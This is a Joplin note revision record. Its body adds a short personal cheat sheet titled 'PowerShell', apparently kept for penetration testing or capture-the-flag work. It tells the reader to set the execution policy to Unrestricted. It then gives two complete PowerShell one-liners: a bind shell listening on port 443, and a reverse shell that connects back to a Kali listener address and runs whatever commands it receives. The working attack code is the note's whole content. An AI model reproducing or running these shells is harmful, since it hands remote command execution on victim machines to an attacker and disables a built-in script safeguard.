id: 648dfcec2ac04f91a7994dffdfd0ae40
parent_id: 
item_type: 1
item_id: 1a72f4e7464d467d810fc01a3adf9ed0
item_updated_time: 1642143766017
title_diff: "[{\"diffs\":[[1,\"PowerShell\"]],\"start1\":0,\"start2\":0,\"length1\":0,\"length2\":10}]"
body_diff: "[{\"diffs\":[[1,\"Remember to make the computer set the executionPolicy unrestricted\\\n\\\n> Set-ExecutionPolicy Unrestricted\\\n\\\nBind shell: powershell -c \\\"$listener = New-Object System.Net.Sockets.TcpListener( '0.0.0.0',443); $listener.start();$client = $listener.AcceptTcpClient();$stream = $client.GetStream();\\\\[byte\\\\[\\\\]\\\\]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){ $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = (\\\\[text.encoding\\\\]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close();$listener.Stop()\\\"\\\n\\\nReverse Bind shell (With kali as listener): powershell -c \\\"$client = New-Object System.Net.Sockets.TCPClient('10. 11.0.4',443); $stream = $client.GetStream(); \\\\[byte\\\\[\\\\]\\\\]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String ); $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = (\\\\[text.encoding\\\\]::ASCII ).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()\\\"\"]],\"start1\":0,\"start2\":0,\"length1\":0,\"length2\":1281}]"
metadata_diff: {"new":{"id":"1a72f4e7464d467d810fc01a3adf9ed0","parent_id":"b8fe3751a1b24ee7ad3f067e0a5bfdcd","latitude":"1.36730000","longitude":"103.80140000","altitude":"0.0000","author":"","source_url":"","is_todo":0,"todo_due":0,"todo_completed":0,"source":"joplin-desktop","source_application":"net.cozic.joplin-desktop","application_data":"","order":0,"markup_language":1,"is_shared":0,"share_id":"","conflict_original_id":"","master_key_id":""},"deleted":[]}
encryption_cipher_text: 
encryption_applied: 0
updated_time: 2022-01-14T07:02:53.751Z
created_time: 2022-01-14T07:02:53.751Z
type_: 13